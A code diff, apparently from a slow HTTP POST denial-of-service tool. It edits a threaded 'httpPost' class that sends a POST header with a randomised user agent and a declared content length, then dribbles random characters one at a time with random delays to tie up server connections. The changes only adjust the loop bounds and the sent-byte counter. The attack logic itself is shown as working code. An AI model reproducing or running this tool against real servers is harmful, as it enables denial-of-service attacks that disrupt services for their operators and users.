@@ -369,14 +369,14 @@ class httpPost(Thread):
                         "Content-Type: application/x-www-form-urlencoded\r\n\r\n" %
                         (self.host, random.choice(useragents), contentlength))
 
-        for i in range(0, contentlength - 1):
+        for i in range(1, contentlength):
             if stop_now:
                 self.running = False
                 break
             p = random.choice(string.ascii_letters+string.digits)
             print(term.BOL+term.UP+term.CLEAR_EOL+"[%d]: Posting: %s" % (self.threadid, p+term.NORMAL))
             self.socks.send(p)
-            self.sentcount += 1
+            self.sentcount = i
             time.sleep(random.uniform(0.1, maxsecondsbetweenpacket))
 
         # self.socks.close()
